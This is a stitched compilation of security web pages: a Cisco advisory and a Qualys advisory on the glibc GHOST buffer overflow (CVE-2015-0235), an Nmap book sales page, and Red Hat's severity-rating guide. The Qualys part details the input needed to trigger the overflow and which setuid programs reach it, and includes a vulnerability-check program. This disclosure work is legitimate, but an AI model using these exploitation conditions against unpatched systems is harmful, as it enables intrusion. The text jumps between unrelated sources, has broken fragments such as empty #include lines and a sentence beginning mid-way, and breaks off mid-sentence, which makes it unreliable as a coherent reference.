Details  * A buffer overflow was found in the GNU C library's (glibc) *\_\_nss\_hostname\_digits\_dots()* function, which, in turn, is used by the *gethostbyname()*, *gethostbyname2()*, and other glibc function calls. The vulnerable code in the affected functions is designed to prevent DNS lookups for addresses that do not need to be resolved (i.e. they are already IPv4 or IPv6 addresses). These vulnerable functions are commonly used by networking applications.      Systems that contain glibc versions 2.2 to 2.17 are affected by this vulnerability. Applications that statically link to an affected version are also affected by this vulnerability.      The impact of this vulnerability varies based on hardware and software configurations. A remote, unauthenticated attacker that is able to provide a hostname to an application that is using an affected function may be able to exploit this vulnerability to obtain sensitive information from memory or perform remote code execution with the same privileges as the process or application being exploited.      This vulnerability has been assigned the Common Vulnerabilities and Exposures (CVE) ID CVE-2015-0235.      More information provided for each bug ID listed in the "Vulnerable Products" section of this advisory can be found in the [Cisco Bug Search Tool](https://bst.cloudapps.cisco.com/bugsearch/ "Bug Search Tool").  Workarounds  * There are currently no network-based mitigations for this vulnerability or any mitigations that can be performed directly on affected systems.      Cisco has published an Event Response for this vulnerability: <http://www.cisco.com/web/about/security/intelligence/ERP_GHOST_29-Jan-2015.html>  Fixed Software  * When considering software upgrades, customers are advised to consult the Cisco Security Advisories, Responses, and Notices archive at <http://www.cisco.com/go/psirt> and review subsequent advisories to determine exposure and a complete upgrade solution.      In all cases, customers should ensure that the devices to be upgraded contain sufficient memory and confirm that current hardware and software configurations will continue to be supported properly by the new release. If the information is not clear, customers are advised to contact the Cisco Technical Assistance Center (TAC) or their contracted maintenance providers.

# Nmap Network Scanning

[![Cover of Nmap Network Scanning](https://nmap.org/book/cover/nns-whole-cover-326x200.jpg)](http://www.amazon.com/dp/0979958717?tag=secbks-20)

*Nmap Network Scanning* is
the official guide to the [Nmap Security Scanner](https://nmap.org/),
a free and open source utility used by millions of people for
network discovery, administration, and security auditing. From
explaining port scanning basics for novices to detailing
low-level packet crafting methods used by advanced hackers, this book suits
all levels of security and networking professionals. A 42-page reference
guide documents every Nmap feature and option, while the rest of the
book demonstrates how to apply those features to quickly solve
real-world tasks. Examples and diagrams show actual communication on
the wire.

Topics include subverting firewalls and intrusion detection systems,
optimizing Nmap performance, and automating common networking tasks
with the Nmap Scripting Engine. Hints and instructions are provided
for common uses such as taking network inventory, penetration testing,
detecting rogue wireless access points, and quashing network worm
outbreaks. Nmap runs on Windows, Linux, and Mac OS X.

Nmap's original author, Gordon “Fyodor” Lyon, wrote
this book to share everything he has learned about network scanning
during more than a decade of Nmap development. It was briefly the #1
selling computer book on Amazon
([screenshot](https://nmap.org/book/img/nns-top-seller-942x1024.png)).
The book is in English, though [several translations](#translations) are in the works.

Key facts: The ISBN is 978-0-9799587-1-7 (ISBN-10 is 0-9799587-1-7)
and suggested retail prices are $49.95 in the U.S., £34.95 in
the U.K., and €39.95 in Europe. Like most books, it costs less
online (as little as $32.97 - see [purchasing
options](#purchase)). It is 468 pages long. The official release date was
January 1, 2009, though Amazon managed to beat that by a couple weeks.

About half of the content is [available in the
free online edition](toc.html). Chapters exclusive to the print edition
include “Detecting and Subverting Firewalls and Intrusion
Detection Systems”, “Optimizing Nmap Performance”,
“Port Scanning Techniques and Algorithms”, “Host
Discovery (Ping Scanning)”, and more.
The *solution* selections which provide detailed
instructions on the best way to solve common networking tasks are also
exclusive to the printed book. The
[final table of contents](toc.pdf) and [cover art](cover/) are available.

## Updates

Several people asked whether Nmap Network Scanning
is still up to date, particularly after the release of [Nmap 5.00](https://nmap.org/5/). The good news is that virtually all of the
content remains accurate. But we have added some new features and
NSE scripts which aren't yet documented in NNS.

For a comprehensive and completely current view of Nmap, I
recommend reading Nmap Network Scanning first, then read all the
changelog entries we've produced since the book was finished. The
book is completely up-to-date with Nmap 4.76. So after (or before)
you're done reading Nmap Network Scanning, visit
the [Nmap changelog](https://nmap.org/changelog.html) and search
in the file for “Nmap 4.76”. Read each item upward from there
(scrolling backward) until you get to the top.
## Translations

We would love to make the Nmap book more accessible by working with foreign publishers who will translate and distribute it in their markets. If you are such a publisher or know a good one to suggest, please let me know. Here are the current or in-progress translations:

their “Search Inside” program. While Amazon intends this
as a marketing tool for prospective buyers, it can be even more useful
for folks who already own the book. While we're proud of our index,
Search Inside can help find more obscure terms or combinations of them. You can try this out by visiting
the [Amazon
NNS page](http://www.amazon.com/dp/0979958717?tag=secbks-20), scrolling down to the Search Inside box, and typing in a
term such as Trinity or Microsoft.

**December 9, 2008:** Sales were so high that Amazon ran out of stock in the US, UK, and Germany. They say it may take a week or more to ship.

**December 9, 2008:** Nmap Network Scanning sales surge further to become #1 on [Amazon's computer book best seller list](http://www.amazon.com/gp/bestsellers/books/5/ref%3Dpd_zg_hrsr_b_1_2%26tag%3Dsecbks-20)! Since we can't keep that rank forever, I took a [screenshot](img/nns-top-seller-471x512.png) ([larger version](img/nns-top-seller-942x1024.png)).

**December 8, 2008:**
An [excellent
Slashdot review](http://books.slashdot.org/books/08/12/08/1443223.shtml) causes NNS to rocket into [Amazon's top 10 computer books](http://www.amazon.com/gp/bestsellers/books/5/ref%3Dpd_zg_hrsr_b_1_2%26tag%3Dsecbks-20).

**December 6, 2008:** Amazon has [fixed the price](http://www.amazon.com/dp/0979958717?tag=secbks-20) so it is now $33.71 rather than $49.95. NNS is **in stock and shipping**!

**December 2, 2008:** The book has [an initial page on Amazon](http://www.amazon.com/dp/0979958717?tag=secbks-20). You can pre-order it now, but Amazon is showing a pre-order price of $49.95. I expect the price to be about $33 when Amazon starts shipping it within a week or two. Amazon will probably refund the difference per their "Pre-order price guarantee", but it might be safer to wait. Book seller BOOKSPLUSMORESTUFF claims to have the book "in stock" on Amazon for $53.94 including shipping. That may or may not be true.

**November 14, 2008:** The book is finished and submitted to the
printer! The official release date is January 1, 2009, though our
goal is to make it available on Amazon and other retailers by
mid-December. To be notified upon publication, join the
low-traffic [nmap-hackers
announcement mailing list](https://nmap.org/mailman/listinfo/announce).

**September 15, 2008:** The Black Hat/Defcon pre-release was a huge
success! All of the Defcon copies were snapped up as soon as the
vendor room opened, and the Black Hat copies also sold out in the
first morning of the conference. Thanks to Bill Pollock of No Starch
Press and Dave Hemsath of BreakPoint Books for handling sales. My
conference presentation video and audio have
been [posted
online](http://insecure.org/presentations/) just in time for
the [Nmap
4.75 release](http://seclists.org/nmap-hackers/2008/0004.html) which includes the new features discussed in that
presentation.

**July 25, 2008**: Defcon Pre-Release announced! We have decided to
launch the book with a limited pre-release version at Defcon 16.

**July 1, 2008**: After years of work, Nmap Network Scanning is nearing completion. You can browse the [current table of contents](toc.pdf) to see what is coming. We recently conducted a test-printing of some prepublication copies:

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

Qualys Security Advisory CVE-2015-0235
GHOST: glibc gethostbyname buffer overflow
--[ Contents ]----------------------------------------------------------------

6 - Acknowledgments
--[ 1 - Summary ]-------------------------------------------------------------
During a code audit performed internally at Qualys, we discovered a
buffer overflow in the \_\_nss\_hostname\_digits\_dots() function of the GNU
C Library (glibc). This bug is reachable both locally and remotely via
the gethostbyname\*() functions, so we decided to analyze it -- and its
impact -- thoroughly, and named this vulnerability "GHOST".
Our main conclusions are:
- Via gethostbyname() or gethostbyname2(), the overflowed buffer is
located in the heap. Via gethostbyname\_r() or gethostbyname2\_r(), the
overflowed buffer is caller-supplied (and may therefore be located in
the heap, stack, .data, .bss, etc; however, we have seen no such call
in practice).
- At most sizeof(char \*) bytes can be overwritten (ie, 4 bytes on 32-bit
machines, and 8 bytes on 64-bit machines). Bytes can be overwritten
only with digits ('0'...'9'), dots ('.'), and a terminating null
character ('\0').
- Despite these limitations, arbitrary code execution can be achieved.
As a proof of concept, we developed a full-fledged remote exploit
against the Exim mail server, bypassing all existing protections
(ASLR, PIE, and NX) on both 32-bit and 64-bit machines. We will
publish our exploit as a Metasploit module in the near future.
- The first vulnerable version of the GNU C Library is glibc-2.2,
released on November 10, 2000.
- We identified a number of factors that mitigate the impact of this
bug. In particular, we discovered that it was fixed on May 21, 2013
(between the releases of glibc-2.17 and glibc-2.18). Unfortunately, it
was not recognized as a security threat; as a result, most stable and
long-term-support distributions were left exposed (and still are):
Debian 7 (wheezy), Red Hat Enterprise Linux 6 & 7, CentOS 6 & 7,
Ubuntu 12.04, for example.
--[ 2 - Analysis ]------------------------------------------------------------
The vulnerable function, \_\_nss\_hostname\_digits\_dots(), is called
internally by the glibc in nss/getXXbyYY.c (the non-reentrant version)
and nss/getXXbyYY\_r.c (the reentrant version). However, the calls are
surrounded by #ifdef HANDLE\_DIGITS\_DOTS, a macro defined only in:
- inet/gethstbynm.c
- inet/gethstbynm2.c
- inet/gethstbynm\_r.c
- inet/gethstbynm2\_r.c
- nscd/gethstbynm3\_r.c
These files implement the gethostbyname\*() family, and hence the only
way to reach \_\_nss\_hostname\_digits\_dots() and its buffer overflow. The
purpose of this function is to avoid expensive DNS lookups if the
hostname argument is already an IPv4 or IPv6 address.
The code below comes from glibc-2.17:
35 int
36 \_\_nss\_hostname\_digits\_dots (const char \*name, struct hostent \*resbuf,
37 char \*\*buffer, size\_t \*buffer\_size,
38 size\_t buflen, struct hostent \*\*result,
39 enum nss\_status \*status, int af, int \*h\_errnop)
40 {
..
57 if (isdigit (name[0]) || isxdigit (name[0]) || name[0] == ':')
58 {
59 const char \*cp;
60 char \*hostname;
61 typedef unsigned char host\_addr\_t[16];
62 host\_addr\_t \*host\_addr;
63 typedef char \*host\_addr\_list\_t[2];
64 host\_addr\_list\_t \*h\_addr\_ptrs;
65 char \*\*h\_alias\_ptr;
66 size\_t size\_needed;
..
85 size\_needed = (sizeof (\*host\_addr)
86 + sizeof (\*h\_addr\_ptrs) + strlen (name) + 1);
87
88 if (buffer\_size == NULL)
89 {
90 if (buflen < size\_needed)
91 {
..
95 goto done;
96 }
97 }
98 else if (buffer\_size != NULL && \*buffer\_size < size\_needed)
99 {
100 char \*new\_buf;
101 \*buffer\_size = size\_needed;
102 new\_buf = (char \*) realloc (\*buffer, \*buffer\_size);
103
104 if (new\_buf == NULL)
105 {
...
114 goto done;
115 }
116 \*buffer = new\_buf;
117 }
...
121 host\_addr = (host\_addr\_t \*) \*buffer;
122 h\_addr\_ptrs = (host\_addr\_list\_t \*)
123 ((char \*) host\_addr + sizeof (\*host\_addr));
124 h\_alias\_ptr = (char \*\*) ((char \*) h\_addr\_ptrs + sizeof (\*h\_addr\_ptrs));
125 hostname = (char \*) h\_alias\_ptr + sizeof (\*h\_alias\_ptr);
126
127 if (isdigit (name[0]))
128 {
129 for (cp = name;; ++cp)
130 {
131 if (\*cp == '\0')
132 {
133 int ok;
134
135 if (\*--cp == '.')
136 break;
...
142 if (af == AF\_INET)
143 ok = \_\_inet\_aton (name, (struct in\_addr \*) host\_addr);
144 else
145 {
146 assert (af == AF\_INET6);
147 ok = inet\_pton (af, name, host\_addr) > 0;
148 }
149 if (! ok)
150 {
...
154 goto done;
155 }
156
157 resbuf->h\_name = strcpy (hostname, name);
...
194 goto done;
195 }
196
197 if (!isdigit (\*cp) && \*cp != '.')
198 break;
199 }
200 }
...
Lines 85-86 compute the size\_needed to store three (3) distinct entities
in buffer: host\_addr, h\_addr\_ptrs, and name (the hostname). Lines 88-117
make sure the buffer is large enough: lines 88-97 correspond to the
reentrant case, lines 98-117 to the non-reentrant case.
Lines 121-125 prepare pointers to store four (4) distinct entities in
buffer: host\_addr, h\_addr\_ptrs, h\_alias\_ptr, and hostname. The sizeof
(\*h\_alias\_ptr) -- the size of a char pointer -- is missing from the
computation of size\_needed.
The strcpy() on line 157 should therefore allow us to write past the end
of buffer, at most (depending on strlen(name) and alignment) 4 bytes on
32-bit machines, or 8 bytes on 64-bit machines. There is a similar
strcpy() after line 200, but no buffer overflow:
236 size\_needed = (sizeof (\*host\_addr)
237 + sizeof (\*h\_addr\_ptrs) + strlen (name) + 1);
...
267 host\_addr = (host\_addr\_t \*) \*buffer;
268 h\_addr\_ptrs = (host\_addr\_list\_t \*)
269 ((char \*) host\_addr + sizeof (\*host\_addr));
270 hostname = (char \*) h\_addr\_ptrs + sizeof (\*h\_addr\_ptrs);
...
289 resbuf->h\_name = strcpy (hostname, name);
In order to reach the overflow at line 157, the hostname argument must
meet the following requirements:
- Its first character must be a digit (line 127).
- Its last character must not be a dot (line 135).
- It must comprise only digits and dots (line 197) (we call this the
"digits-and-dots" requirement).
- It must be long enough to overflow the buffer. For example, the
non-reentrant gethostbyname\*() functions initially allocate their
buffer with a call to malloc(1024) (the "1-KB" requirement).
- It must be successfully parsed as an IPv4 address by inet\_aton() (line
143), or as an IPv6 address by inet\_pton() (line 147). Upon careful
analysis of these two functions, we can further refine this
"inet-aton" requirement:
. It is impossible to successfully parse a "digits-and-dots" hostname
as an IPv6 address with inet\_pton() (':' is forbidden). Hence it is
impossible to reach the overflow with calls to gethostbyname2() or
gethostbyname2\_r() if the address family argument is AF\_INET6.
. Conclusion: inet\_aton() is the only option, and the hostname must
have one of the following forms: "a.b.c.d", "a.b.c", "a.b", or "a",
where a, b, c, d must be unsigned integers, at most 0xfffffffful,
converted successfully (ie, no integer overflow) by strtoul() in
decimal or octal (but not hexadecimal, because 'x' and 'X' are
forbidden).
--[ 3 - Mitigating factors ]--------------------------------------------------
The impact of this bug is reduced significantly by the following
reasons:
- A patch already exists (since May 21, 2013), and has been applied and
tested since glibc-2.18, released on August 12, 2013:
[BZ #15014]
\* nss/getXXbyYY\_r.c (INTERNAL (REENTRANT\_NAME))
[HANDLE\_DIGITS\_DOTS]: Set any\_service when digits-dots parsing was
successful.
\* nss/digits\_dots.c (\_\_nss\_hostname\_digits\_dots): Remove
redundant variable declarations and reallocation of buffer when
parsing as IPv6 address. Always set NSS status when called from
reentrant functions. Use NETDB\_INTERNAL instead of TRY\_AGAIN when
buffer too small. Correct computation of needed size.
\* nss/Makefile (tests): Add test-digits-dots.
\* nss/test-digits-dots.c: New test.
- The gethostbyname\*() functions are obsolete; with the advent of IPv6,
recent applications use getaddrinfo() instead.
- Many programs, especially SUID binaries reachable locally, use
gethostbyname() if, and only if, a preliminary call to inet\_aton()
fails. However, a subsequent call must also succeed (the "inet-aton"
requirement) in order to reach the overflow: this is impossible, and
such programs are therefore safe.
- Most of the other programs, especially servers reachable remotely, use
gethostbyname() to perform forward-confirmed reverse DNS (FCrDNS, also
known as full-circle reverse DNS) checks. These programs are generally
safe, because the hostname passed to gethostbyname() has normally been
pre-validated by DNS software:
. "a string of labels each containing up to 63 8-bit octets, separated
by dots, and with a maximum total of 255 octets." This makes it
impossible to satisfy the "1-KB" requirement.
. Actually, glibc's DNS resolver can produce hostnames of up to
(almost) 1025 characters (in case of bit-string labels, and special
or non-printable characters). But this introduces backslashes ('\\')
and makes it impossible to satisfy the "digits-and-dots"
requirement.
--[ 4 - Case studies ]--------------------------------------------------------
In this section, we will analyze real-world examples of programs that
call the gethostbyname\*() functions, but we first introduce a small test
program that checks whether a system is vulnerable or not:
[user@fedora-19 ~]$ cat > GHOST.c << EOF
#include
#include
#include
#include
#include
#define CANARY "in\_the\_coal\_mine"
struct {
char buffer[1024];
char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };
int main(void) {
struct hostent resbuf;
struct hostent \*result;
int herrno;
int retval;
/\*\*\* strlen (name) = size\_needed - sizeof (\*host\_addr) - sizeof (\*h\_addr\_ptrs) - 1; \*\*\*/
size\_t len = sizeof(temp.buffer) - 16\*sizeof(unsigned char) - 2\*sizeof(char \*) - 1;
char name[sizeof(temp.buffer)];
memset(name, '0', len);
name[len] = '\0';
retval = gethostbyname\_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);
if (strcmp(temp.canary, CANARY) != 0) {
puts("vulnerable");
exit(EXIT\_SUCCESS);
}
if (retval == ERANGE) {
puts("not vulnerable");
exit(EXIT\_SUCCESS);
}
puts("should not happen");
exit(EXIT\_FAILURE);
}
EOF
[user@fedora-19 ~]$ gcc GHOST.c -o GHOST
On Fedora 19 (glibc-2.17):
[user@fedora-19 ~]$ ./GHOST
vulnerable
On Fedora 20 (glibc-2.18):
[user@fedora-20 ~]$ ./GHOST
not vulnerable
----[ 4.1 - The GNU C Library ]-----------------------------------------------
The glibc itself contains a few calls to gethostbyname\*() functions. In
particular, getaddrinfo() calls gethostbyname2\_r() if, but only if, a
first call to inet\_aton() fails: in accordance with the "inet-aton"
requirement, these internal calls are safe. For example,
eglibc-2.13/sysdeps/posix/getaddrinfo.c:
at->family = AF\_UNSPEC;
...
if (\_\_inet\_aton (name, (struct in\_addr \*) at->addr) != 0)
{
if (req->ai\_family == AF\_UNSPEC || req->ai\_family == AF\_INET)
at->family = AF\_INET;
else if (req->ai\_family == AF\_INET6 && (req->ai\_flags & AI\_V4MAPPED))
{
...
at->family = AF\_INET6;
}
else
return -EAI\_ADDRFAMILY;
...
}
...
if (at->family == AF\_UNSPEC && (req->ai\_flags & AI\_NUMERICHOST) == 0)
{
...
size\_t tmpbuflen = 512;
char \*tmpbuf = alloca (tmpbuflen);
...
rc = \_\_gethostbyname2\_r (name, family, &th, tmpbuf,
tmpbuflen, &h, &herrno);
...
}
----[ 4.2 - mount.nfs ]-------------------------------------------------------
Similarly, mount.nfs (a SUID-root binary) is not vulnerable:
if (inet\_aton(hostname, &addr->sin\_addr))
return 0;
if ((hp = gethostbyname(hostname)) == NULL) {
nfs\_error(\_("%s: can't get address for %s\n"),
progname, hostname);
return -1;
}
----[ 4.3 - mtr ]-------------------------------------------------------------
mtr (another SUID-root binary) is not vulnerable either, because it
calls getaddrinfo() instead of gethostbyname\*() functions on any modern
(ie, IPv6-enabled) system:
#ifdef ENABLE\_IPV6
/\* gethostbyname2() is deprecated so we'll use getaddrinfo() instead. \*/
...
error = getaddrinfo( Hostname, NULL, &hints, &res );
if ( error ) {
if (error == EAI\_SYSTEM)
perror ("Failed to resolve host");
else
fprintf (stderr, "Failed to resolve host: %s\n", gai\_strerror(error));
exit( EXIT\_FAILURE );
}
...
#else
host = gethostbyname(Hostname);
if (host == NULL) {
herror("mtr gethostbyname");
exit(1);
}
...
#endif
----[ 4.4 - iputils ]---------------------------------------------------------
------[ 4.4.1 - clockdiff ]---------------------------------------------------
clockdiff is vulnerable in a straightforward manner:
hp = gethostbyname(argv[1]);
if (hp == NULL) {
fprintf(stderr, "clockdiff: %s: host not found\n", argv[1]);
exit(1);
}
[user@fedora-19-32b ~]$ ls -l /usr/sbin/clockdiff

------[ 4.4.2 - ping and arping ]---------------------------------------------
ping and arping call gethostbyname() and gethostbyname2(), respectively,
if and only if inet\_aton() fails first. This time, however, there is
another function call in between (Fedora, for example, does define
USE\_IDN):
--------[ 4.4.2.1 - ping ]----------------------------------------------------
if (inet\_aton(target, &whereto.sin\_addr) == 1) {
...
} else {
char \*idn;
#ifdef USE\_IDN
int rc;
...
rc = idna\_to\_ascii\_lz(target, &idn, 0);
if (rc != IDNA\_SUCCESS) {
fprintf(stderr, "ping: IDN encoding failed: %s\n", idna\_strerror(rc));
exit(2);
}
#else
idn = target;
#endif
hp = gethostbyname(idn);
--------[ 4.4.2.2 - arping ]--------------------------------------------------
if (inet\_aton(target, &dst) != 1) {
struct hostent \*hp;
char \*idn = target;
#ifdef USE\_IDN
int rc;
rc = idna\_to\_ascii\_lz(target, &idn, 0);
if (rc != IDNA\_SUCCESS) {
fprintf(stderr, "arping: IDN encoding failed: %s\n", idna\_strerror(rc));
exit(2);
}
#endif
hp = gethostbyname2(idn, AF\_INET);
--------[ 4.4.2.3 - Analysis ]------------------------------------------------
If idna\_to\_ascii\_lz() modifies the target hostname, the first call to
inet\_aton() could fail and the second call (internal to gethostbyname())
could succeed. For example, idna\_to\_ascii\_lz() transforms any Unicode
dot-like character (0x3002, 0xFF0E, 0xFF61) into an ASCII dot (".").
But it also restricts the length of a domain label to 63 characters:
this makes it impossible to reach 1024 bytes (the "1-KB" requirement)
with only 4 labels and 3 dots (the "inet-aton" requirement).
Unless inet\_aton() (actually, strtoul()) can be tricked into accepting
more than 3 dots? Indeed, idna\_to\_ascii\_lz() does not restrict the total
length of a domain name. glibc supports "thousands' grouping characters"
(man 3 printf); for example, sscanf(str, "%'lu", &ul) yields 1000 when
processing any of the following input strings:
- "1,000" in an English locale;
- "1 000" in a French locale; and
- "1.000" in a German or Spanish locale.
strtoul() implements this "number grouping" too, but its use is limited
to internal glibc functions. Conclusion: more than 3 dots is impossible,
and neither ping nor arping is vulnerable.
----[ 4.5 - procmail ]--------------------------------------------------------
procmail (a SUID-root and SGID-mail binary) is vulnerable through its
"comsat/biff" feature:
#define COMSAThost "localhost" /\* where the biff/comsat daemon lives \*/
...
#define SERV\_ADDRsep '@' /\* when overriding in COMSAT=serv@addr \*/
int setcomsat(chp)const char\*chp;
{ char\*chad; ...
chad=strchr(chp,SERV\_ADDRsep); /\* @ separator? \*/
...
if(chad)
\*chad++='\0'; /\* split the specifier \*/
if(!chad||!\*chad) /\* no host \*/
#ifndef IP\_localhost /\* Is "localhost" preresolved? \*/
chad=COMSAThost; /\* nope, use default \*/
#else /\* IP\_localhost \*/
{ ...
}
else
#endif /\* IP\_localhost \*/
{ ...
if(!(host=gethostbyname(chad))||!host->h\_0addr\_list)

----[ 4.6 - pppd ]------------------------------------------------------------
pppd (yet another SUID-root binary) calls gethostbyname() if a
preliminary call to inet\_addr() (a simple wrapper around inet\_aton())
fails. "The inet\_addr() function converts the Internet host address cp
from IPv4 numbers-and-dots notation into binary data in network byte
order. If the input is invalid, INADDR\_NONE (usually -1) is returned.
Use of this function is problematic because -1 is a valid address
(255.255.255.255)." A failure for inet\_addr(), but a success for
